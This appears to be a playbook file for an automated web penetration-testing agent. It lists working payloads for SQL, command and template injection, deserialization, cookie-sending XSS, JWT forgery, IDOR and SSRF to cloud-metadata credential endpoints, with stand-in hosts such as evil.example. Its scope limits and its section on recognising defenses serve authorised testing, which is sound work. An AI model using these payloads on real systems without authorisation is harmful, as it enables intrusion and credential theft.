# Exploitation Techniques

Per-class playbooks. Use these as starting points for witness payloads.
ALWAYS apply scope enforcement before sending anything from this file.

## Injection

### SQL Injection

Witness sequence (UNION-blind safe):
1. Baseline: capture response for original parameter
2. `' AND 1=1--` (true branch)
3. `' AND 1=2--` (false branch)
4. Compare lengths/bodies. Difference = SQLi.

Time-based:
- MySQL: `' AND SLEEP(5)--`
- Postgres: `'; SELECT pg_sleep(5)--`
- MSSQL: `'; WAITFOR DELAY '0:0:5'--`
- SQLite: `' AND randomblob(100000000)--` (CPU-burn alternative)

DO NOT send: `'; DROP TABLE` payloads. Reproducing the bug doesn't
require destruction.

### Command Injection

Witness:
- Linux: `; sleep 5` or `$(sleep 5)` or `` `sleep 5` ``
- Windows: `& timeout /t 5`
- If output is reflected: `; echo HERMESPENTEST-$(id)`

Blind: time-delay probe is universally safe. Don't `rm -rf`.

### Path Traversal

Witness: `../../../../etc/passwd` (Linux) or `..\..\..\..\windows\win.ini` (Windows).
Try with: URL-encoded, double-encoded, Unicode (`%c0%ae%c0%ae`),
and SMB UNC (`\\evil-host\share` — only with operator OK).

### SSTI (Server-Side Template Injection)

Witness:
- Jinja2: `{{7*7}}` → `49`
- Twig: `{{7*7}}` → `49`
- Smarty: `{$smarty.version}` or `{php}echo 1;{/php}`
- ERB: `<%= 7*7 %>` → `49`
- Velocity: `#set($x=7*7)$x`

Detection is the 49 (or template-specific equivalent). Don't go to RCE
without operator OK.

### Deserialization

If you can identify the format:
- Pickle: send `cos\nsystem\n(S'sleep 5'\ntR.` (base64'd, in the
  right context). Witness via time delay.
- YAML: `!!python/object/apply:os.system ["sleep 5"]`
- Java serialized: ysoserial gadgets, only with operator OK because
  these almost always RCE.

## XSS

### Reflected

Witness: `<svg/onload=fetch("/HERMES-PENTEST-XSS-"+document.cookie)>`
where the path is one you'll grep for in server logs. NEVER use
`alert(1)` — pop-ups annoy real users if your "test" target has any.

If reflected unencoded → L3 confirmed.

### Stored

Witness in a way that ONLY YOUR test account sees first. Use a unique
marker per finding. If the marker fires for other users → L4 critical.

Pattern: `<svg/onload=fetch("/HERMES-${runId}-${vulnId}")>`. Add a
server-side log grep step to your evidence.

### DOM XSS

Inspect every `document.write`, `innerHTML`, `eval`, `setTimeout(string)`,
`Function(string)`, `setAttribute("href", ...)` site. The taint source
is usually `location.hash`, `location.search`, `localStorage`,
`postMessage` data, URL fragments.

Witness: navigate to `#<img src=x onerror=...>`. Confirm the
sink fires.

## Auth

### Login Bypass

- SQLi in login: `' OR '1'='1` (very old, but check)
- Boolean defaults: `username: admin, password: admin/password/123456`
  (only on lab targets, not production)
- Account enumeration: timing or response difference between
  "unknown user" vs "wrong password"
- Rate limiting: send 50 wrong passwords in 30s; see if you're throttled

### JWT Attacks

1. **alg:none**: change header to `{"alg":"none","typ":"JWT"}`, strip
   signature. If accepted → critical.
2. **alg confusion**: HS256 signed with the RS256 public key. If the
   server stores the RS256 cert as a "secret" and the algorithm is
   attacker-controlled, this works.
3. **Weak HMAC secret**: try `jwt_tool` or `hashcat` against the JWT
   with rockyou.txt (only if you have operator OK to crack).
4. **kid header injection**: `kid` set to a SQLi payload or path-traversal
   to load a known key.
5. **Expired token still accepted**: replay an old token.

### Session

- Cookie attrs: `Secure`, `HttpOnly`, `SameSite=Strict|Lax`.
- Session fixation: log in, note cookie, log out, log in again — same
  cookie? Vulnerable.
- Logout: does logout invalidate server-side, or just clear the client?

### Password Reset

- Predictable token (timestamp, sequential, weak random)
- Host header poisoning in reset link (`Host: evil.test`)
- No rate limit on reset endpoint
- Token reuse / no expiry
- Email enumeration via reset response

## Authz (Access Control)

### IDOR

Pattern: change `?id=123` to `?id=124`. If you see another user's data,
L3 confirmed.

Variants:
- Sequential IDs (easy)
- UUIDs (still try — they leak in logs/responses)
- Mass assignment: send extra params like `is_admin: true`, `role: admin`
- HTTP method override: `GET /users/123` works, but `PUT /users/123` is
  not authz-checked

### Privilege Escalation

Vertical: regular user → admin endpoint. Check:
- `/admin/*` accessible to non-admin?
- `role` field in JWT/session client-editable?
- Tenant ID swap: `tenant_id=mine` → `tenant_id=theirs`

Horizontal: user A → user B same role. Reuse IDOR patterns.

### Business Logic

- Negative quantity in cart
- Race conditions (double-spend, atomicity)
- Workflow skip (POST to step 3 without doing step 2)
- Coupon stacking
- Discount > total

## SSRF

Witnesses for SSRF probing (only to hosts the operator approved):

- Operator-owned callback (`https://hermes-callback.example/abcdef`)
  — confirms the request left the target's network
- Internal recon (operator OK + scope): `http://127.0.0.1:6379/`,
  `http://127.0.0.1:9200/`, `http://[::1]:80/`

Cloud metadata (operator OK + your own infra):
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/` (needs
  `Metadata-Flavor: Google`)
- Azure: `http://169.254.169.254/metadata/identity/oauth2/token`
- Alibaba/Aliyun: `http://100.100.100.200/`

Protocol smuggling:
- `gopher://` for Redis/Memcache/SMTP attacks (only with operator OK)
- `file:///` for local file read
- `dict://` for service probing

## Infra

- Headers audit: missing `Strict-Transport-Security`, `Content-Security-Policy`,
  `X-Content-Type-Options: nosniff`, `X-Frame-Options`/`frame-ancestors`,
  `Referrer-Policy`
- TLS audit: weak ciphers, missing HSTS, mixed content
- Information disclosure: `Server:`, `X-Powered-By:`, error stack traces,
  default landing pages (`/server-status`, `/.git/`, `/.env`, `/phpinfo.php`)
- Default creds: only on lab targets
- Open redirects: `?next=https://evil.example/` — confirms misuse for
  phishing chains

## Defense Recognition (don't waste cycles)

Skip past these — they're working defenses, not vulns:

- Parameterized queries via the language's standard binding
- Content Security Policy with no `unsafe-inline`/`unsafe-eval` and
  a strict source list
- argv-list subprocess invocation (Python `subprocess.run([...])`
  without `shell=True`)
- `yaml.safe_load`, JSON-only deserialization
- Allowlist-based redirects to a small set of known hosts
- Auth checks with explicit "owner == current_user" on every record fetch
- JWT verification with both `alg` allowlist and `iss`/`aud`/`exp` checks
